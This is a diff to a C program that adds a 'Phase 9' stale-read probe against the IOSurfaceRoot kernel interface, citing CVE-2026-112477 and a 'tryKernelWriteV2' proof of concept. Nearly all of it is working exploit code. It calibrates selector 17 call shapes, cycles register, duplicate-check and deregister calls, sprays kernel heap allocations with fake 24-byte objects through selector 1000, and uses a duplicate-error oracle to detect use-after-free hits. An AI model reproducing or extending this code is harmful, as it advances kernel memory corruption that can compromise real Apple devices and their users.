@@ -17573,6 +17573,242 @@ new_modes:
             CFRelease(ep);
             for (int ni = 0; ni < 4; ni++) CFRelease(en[ni]);
 
+            /* Phase 9: Exact PoC pattern — stale-read via groom (CVE-2026-112477) */
+            rlog("\n--- Phase 9: PoC-pattern stale-read probe ---\n");
+
+            /* The PoC uses input {1,2,3}, not actual surface IDs.
+               It opens fresh connections per test, and uses sel1000 for grooming. */
+
+            /* 9a: Calibrate — test which callSel shape works */
+            rlog("  9a: Calibrate sel17 shapes\n");
+            int best_shape = -1;
+            for (int shape = 0; shape < 4; shape++) {
+                io_connect_t cc = IO_OBJECT_NULL;
+                mach_port_t wp9 = MACH_PORT_NULL;
+                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp9);
+                mach_port_insert_right(mach_task_self(), wp9, wp9, MACH_MSG_TYPE_MAKE_SEND);
+
+                io_service_t svc9 = IOServiceGetMatchingService(
+                    kIOMainPortDefault, IOServiceMatching("IOSurfaceRoot"));
+                if (svc9) {
+                    IOServiceOpen(svc9, mach_task_self(), 0, &cc);
+                    IOObjectRelease(svc9);
+                }
+                if (!cc) { if (wp9) mach_port_deallocate(mach_task_self(), wp9); continue; }
+
+                uint64_t in9[3] = {1, 2, 3};
+                uint64_t buf9[3] = {in9[0], in9[1], in9[2]};
+                uint64_t ref9 = 0x1122334455667788ULL;
+                uint64_t zero9 = 0;
+                uint32_t soc9 = 0;
+                kern_return_t r9;
+
+                switch (shape) {
+                    case 0:
+                        r9 = IOConnectCallMethod(cc, 17, NULL, 0, buf9, 24,
+                            NULL, NULL, NULL, NULL);
+                        break;
+                    case 1:
+                        r9 = IOConnectCallAsyncMethod(cc, 17, wp9, &ref9, 1,
+                            NULL, 0, buf9, 24, NULL, &soc9, NULL, NULL);
+                        break;
+                    case 2:
+                        r9 = IOConnectCallAsyncMethod(cc, 17, wp9, &zero9, 1,
+                            NULL, 0, buf9, 24, NULL, &soc9, NULL, NULL);
+                        break;
+                    case 3:
+                        r9 = IOConnectCallAsyncMethod(cc, 17, wp9, NULL, 0,
+                            NULL, 0, buf9, 24, NULL, &soc9, NULL, NULL);
+                        break;
+                    default: r9 = -1;
+                }
+
+                const char *rn = "?";
+                if (r9 == 0) rn = "OK";
+                else if (r9 == 0xE00002C2) rn = "BadArg";
+                else if (r9 == 0xE00002C9) rn = "DupReg";
+                rlog("    shape=%d: 0x%08x (%s)\n", shape, (uint32_t)r9, rn);
+
+                if (r9 == 0 && best_shape < 0) best_shape = shape;
+                IOServiceClose(cc);
+                mach_port_deallocate(mach_task_self(), wp9);
+            }
+            rlog("    best_shape=%d\n", best_shape);
+
+            /* 9b: Stage B — state machine test (120 iterations, fresh conn each) */
+            if (best_shape >= 0) {
+                rlog("  9b: Stage B state machine (120 iters, fresh conn each)\n");
+                int b_ok = 0;
+                for (int i = 0; i < 120; i++) {
+                    io_connect_t cc = IO_OBJECT_NULL;
+                    mach_port_t wp9 = MACH_PORT_NULL;
+                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wp9);
+                    mach_port_insert_right(mach_task_self(), wp9, wp9, MACH_MSG_TYPE_MAKE_SEND);
+
+                    io_service_t svc9 = IOServiceGetMatchingService(
+                        kIOMainPortDefault, IOServiceMatching("IOSurfaceRoot"));
+                    if (svc9) { IOServiceOpen(svc9, mach_task_self(), 0, &cc); IOObjectRelease(svc9); }
+                    if (!cc) { mach_port_deallocate(mach_task_self(), wp9); continue; }
+
+                    uint64_t in9[3] = {1, 2, 3};
+                    uint64_t buf9[3] = {in9[0], in9[1], in9[2]};
+                    uint64_t ref9 = 0x1122334455667788ULL;
+
+                    /* reg */
+                    kern_return_t r1 = IOConnectCallAsyncMethod(cc, 17, wp9, &ref9, 1,
+                        NULL, 0, buf9, 24, NULL, NULL, NULL, NULL);
+                    /* dup check */
+                    kern_return_t r2 = IOConnectCallAsyncMethod(cc, 17, wp9, &ref9, 1,
+                        NULL, 0, buf9, 24, NULL, NULL, NULL, NULL);
+                    /* dereg (sync shape 0) */
+                    kern_return_t r3 = IOConnectCallMethod(cc, 18, NULL, 0, buf9, 24,
+                        NULL, NULL, NULL, NULL);
+                    /* re-reg */
+                    kern_return_t r4 = IOConnectCallAsyncMethod(cc, 17, wp9, &ref9, 1,
+                        NULL, 0, buf9, 24, NULL, NULL, NULL, NULL);
+
+                    if (r1 == 0 && r2 == 0xE00002C9 && r3 == 0 && r4 == 0)
+                        b_ok++;
+                    else if (i < 5)
+                        rlog("    i=%d r1=0x%x r2=0x%x r3=0x%x r4=0x%x\n",
+                             i, (uint32_t)r1, (uint32_t)r2, (uint32_t)r3, (uint32_t)r4);
+
+                    IOServiceClose(cc);
+                    mach_port_deallocate(mach_task_self(), wp9);
+                }
+                rlog("    Stage B: %d/120%s\n", b_ok,
+                     b_ok == 120 ? " — registry insert/remove controlled" : "");
+
+                /* 9c: Groom probe — test sel1000 availability */
+                rlog("  9c: Test sel1000 (groom vector)\n");
+                io_connect_t gc = IO_OBJECT_NULL;
+                {
+                    io_service_t gs = IOServiceGetMatchingService(
+                        kIOMainPortDefault, IOServiceMatching("IOSurfaceRoot"));
+                    if (gs) { IOServiceOpen(gs, mach_task_self(), 0, &gc); IOObjectRelease(gs); }
+                }
+                if (gc) {
+                    uint8_t fbuf[96]; memset(fbuf, 0x41, sizeof(fbuf));
+                    uint64_t gref = 0xA1B2C3D4E5F60708ULL;
+                    int groom_ok = 0;
+                    mach_port_t groom_wps[64];
+
+                    for (int gi = 0; gi < 64; gi++) {
+                        mach_port_t gwp = MACH_PORT_NULL;
+                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp);
+                        mach_port_insert_right(mach_task_self(), gwp, gwp, MACH_MSG_TYPE_MAKE_SEND);
+                        groom_wps[gi] = gwp;
+
+                        uint32_t gsoc = 0;
+                        kern_return_t gr = IOConnectCallAsyncMethod(gc, 1000, gwp, &gref, 1,
+                            NULL, 0, fbuf, 24, NULL, &gsoc, NULL, NULL);
+                        if (gr == 0) groom_ok++;
+                        if (gi < 5)
+                            rlog("    sel1000 async sz=24 [%d]: 0x%08x\n", gi, (uint32_t)gr);
+                    }
+                    rlog("    sel1000 groom: %d/64 OK\n", groom_ok);
+
+                    /* Free groom ports */
+                    for (int gi = 0; gi < 64; gi++)
+                        if (groom_wps[gi]) mach_port_deallocate(mach_task_self(), groom_wps[gi]);
+
+                    /* 9d: Full stale-read probe (PoC tryKernelWriteV2 pattern) */
+                    rlog("  9d: Stale-read probe (groom + dup oracle)\n");
+                    io_connect_t pc = IO_OBJECT_NULL;
+                    {
+                        io_service_t ps = IOServiceGetMatchingService(
+                            kIOMainPortDefault, IOServiceMatching("IOSurfaceRoot"));
+                        if (ps) { IOServiceOpen(ps, mach_task_self(), 0, &pc); IOObjectRelease(ps); }
+                    }
+                    if (pc) {
+                        int probe_hits = 0;
+                        int probe_sizes[] = {24, 48, 64, 96};
+                        for (int si = 0; si < 4; si++) {
+                            int psz = probe_sizes[si];
+                            for (int pi = 0; pi < 10; pi++) {
+                                mach_port_t pwp = MACH_PORT_NULL;
+                                mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &pwp);
+                                mach_port_insert_right(mach_task_self(), pwp, pwp, MACH_MSG_TYPE_MAKE_SEND);
+
+                                uint64_t pin[3] = {1, 2, 3};
+                                uint64_t pbuf[3] = {pin[0], pin[1], pin[2]};
+                                uint64_t pref = 0x1122334455667788ULL;
+
+                                /* Baseline: reg, dup-check, dereg */
+                                IOConnectCallAsyncMethod(pc, 17, pwp, &pref, 1,
+                                    NULL, 0, pbuf, 24, NULL, NULL, NULL, NULL);
+                                kern_return_t baseDup = IOConnectCallAsyncMethod(pc, 17, pwp, &pref, 1,
+                                    NULL, 0, pbuf, 24, NULL, NULL, NULL, NULL);
+                                IOConnectCallMethod(pc, 18, NULL, 0, pbuf, 24,
+                                    NULL, NULL, NULL, NULL);
+
+                                /* Free the entry: reg then dereg */
+                                IOConnectCallAsyncMethod(pc, 17, pwp, &pref, 1,
+                                    NULL, 0, pbuf, 24, NULL, NULL, NULL, NULL);
+                                IOConnectCallMethod(pc, 18, NULL, 0, pbuf, 24,
+                                    NULL, NULL, NULL, NULL);
+
+                                /* GROOM: spray kalloc with fake 24-byte objects */
+                                mach_port_t g_wps[256];
+                                int g_cnt = 0;
+                                uint8_t gfake[96];
+                                memset(gfake, 0, sizeof(gfake));
+                                /* Fake object: put identifiable pattern */
+                                uint64_t *gf64 = (uint64_t *)gfake;
+                                gf64[0] = 0xDEAD000000000001ULL; /* fake refcnt/id */
+                                gf64[1] = 0x4141414141414141ULL;
+                                gf64[2] = 0x4242424242424242ULL;
+
+                                for (int gi = 0; gi < 256; gi++) {
+                                    mach_port_t gwp2 = MACH_PORT_NULL;
+                                    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp2);
+                                    mach_port_insert_right(mach_task_self(), gwp2, gwp2, MACH_MSG_TYPE_MAKE_SEND);
+                                    g_wps[gi] = gwp2;
+
+                                    kern_return_t gr2 = IOConnectCallAsyncMethod(gc, 1000, gwp2, &gref, 1,
+                                        NULL, 0, gfake, psz, NULL, NULL, NULL, NULL);
+                                    if (gr2 == 0 || gr2 == 0xE00002C2) g_cnt++;
+                                    else { mach_port_deallocate(mach_task_self(), gwp2); g_wps[gi] = MACH_PORT_NULL; }
+                                }
+
+                                /* Dup check on stale entry */
+                                kern_return_t rdup = IOConnectCallAsyncMethod(pc, 17, pwp, &pref, 1,
+                                    NULL, 0, pbuf, 24, NULL, NULL, NULL, NULL);
+                                kern_return_t rdreg = IOConnectCallMethod(pc, 18, NULL, 0, pbuf, 24,
+                                    NULL, NULL, NULL, NULL);
+
+                                int hit = ((uint32_t)baseDup == 0xE00002C9) &&
+                                          ((uint32_t)rdup != 0xE00002C9);
+                                if (hit) probe_hits++;
+
+                                rlog("    sz=%d[%d] baseDup=0x%x dup=0x%x dereg=0x%x groom=%d %s\n",
+                                     psz, pi, (uint32_t)baseDup, (uint32_t)rdup,
+                                     (uint32_t)rdreg, g_cnt,
+                                     hit ? "** STALE-READ **" : "no");
+
+                                /* Free groom */
+                                for (int gi = 0; gi < 256; gi++)
+                                    if (g_wps[gi]) mach_port_deallocate(mach_task_self(), g_wps[gi]);
+                                mach_port_deallocate(mach_task_self(), pwp);
+
+                                usleep(2000);
+
+                                if (probe_hits > 0 && pi >= 2) break;
+                            }
+                            if (probe_hits > 0) {
+                                rlog("    HIT at sz=%d after %d probes!\n", psz, probe_hits);
+                                break;
+                            }
+                        }
+                        rlog("    Total probe_hits=%d\n", probe_hits);
+                        IOServiceClose(pc);
+                    }
+                    IOServiceClose(gc);
+                } else {
+                    rlog("    groom connection failed\n");
+                }
+            }
+
             mach_port_deallocate(mach_task_self(), wake_port);
         }
 
